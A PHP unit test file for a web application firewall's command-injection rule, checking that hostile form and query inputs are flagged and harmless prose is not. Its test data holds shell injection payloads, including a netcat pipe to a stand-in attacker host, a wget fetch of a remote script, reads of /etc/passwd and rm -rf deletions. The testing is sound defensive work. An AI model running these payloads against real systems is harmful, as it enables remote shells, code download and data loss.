<?php

declare(strict_types=1);

namespace FormSpamChecker\Tests\Unit\Waf\Rules;

use FormSpamChecker\Config;
use FormSpamChecker\Tests\Unit\Waf\WafTestCase;
use FormSpamChecker\Waf\Rules\CommandInjectionRule;

final class CommandInjectionRuleTest extends WafTestCase
{
    public function testSemicolonChainedCommandIsAHardFinding(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            method: 'POST',
            uri: '/contact',
            fields: ['message' => 'hello; cat /etc/passwd'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
        self::assertSame(90, $finding->severity);
        self::assertSame('field.message', $finding->location);
    }

    public function testPipeIntoNetcatIsDetected(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            method: 'POST',
            uri: '/contact',
            fields: ['message' => '| nc attacker.example 4444'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
    }

    public function testCommandSubstitutionIsDetected(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            method: 'POST',
            uri: '/contact',
            fields: ['message' => '$(wget http://evil.example/x.sh)'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
    }

    public function testWindowsShellInvocationIsDetected(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            method: 'POST',
            uri: '/contact',
            fields: ['message' => 'cmd.exe /c whoami'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
    }

    public function testCommandWithAbsolutePathIsDetected(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            method: 'POST',
            uri: '/contact',
            fields: ['message' => 'cat /etc/passwd'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
    }

    public function testCommandInAQueryParameterIsDetected(): void
    {
        $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
            uri: '/ping',
            query: ['host' => '127.0.0.1; rm -rf /tmp/x'],
        ));

        $this->assertHardFinding($finding, 'command_injection');
        self::assertSame('query.host', $finding->location);
    }

    public function testOrdinaryProseIsNotFlagged(): void
    {
        $messages = [
            'Спасибо; ответьте, пожалуйста.',
            'It\'s fine; quotes \' and " here.',
            '| id | name |',
            '$(document).ready(function () {})',
            'Use `git status` to check the tree.',
            'См. https://example.ru/report?id=1',
            str_repeat('Длинный текст заявки ', 500),
        ];

        foreach ($messages as $message) {
            $finding = (new CommandInjectionRule(new Config()))->inspect($this->request(
                method: 'POST',
                uri: '/contact',
                fields: ['message' => $message],
            ));

            self::assertNull($finding, 'false positive on: ' . mb_substr($message, 0, 60));
        }
    }

    public function testMultipartAndBinaryBodiesAreExcluded(): void
    {
        $multipart = $this->request(
            method: 'POST',
            uri: '/upload',
            body: '; rm -rf /',
            headers: ['content-type' => 'multipart/form-data; boundary=x'],
        );
        self::assertNull((new CommandInjectionRule(new Config()))->inspect($multipart));
    }

    public function testRuleIsEnabledByDefaultAndCanBeDisabled(): void
    {
        $request = $this->request(method: 'POST', uri: '/contact', fields: ['message' => '; cat /etc/passwd']);

        self::assertTrue((new CommandInjectionRule(new Config()))->enabled());
        self::assertNull((new CommandInjectionRule(new Config([
            'waf' => ['rules' => ['command_injection' => false]],
        ])))->inspect($request));
        self::assertNull((new CommandInjectionRule(new Config(
            [
                'waf' => ['rules' => ['command_injection' => ['enabled' => false]]]],
        )))->inspect($request));
    }

    public function testSeverityIsConfigurable(): void
    {
        $finding = (new CommandInjectionRule(new Config([
            'waf' => ['rules' => ['command_injection' => ['severity' => 65, 'hard' => false]]],
        ])))->inspect($this->request(method: 'POST', uri: '/contact', fields: ['message' => '; cat /etc/passwd']));

        self::assertNotNull($finding);
        self::assertSame(65, $finding->severity);
        self::assertFalse($finding->hard);
    }
}
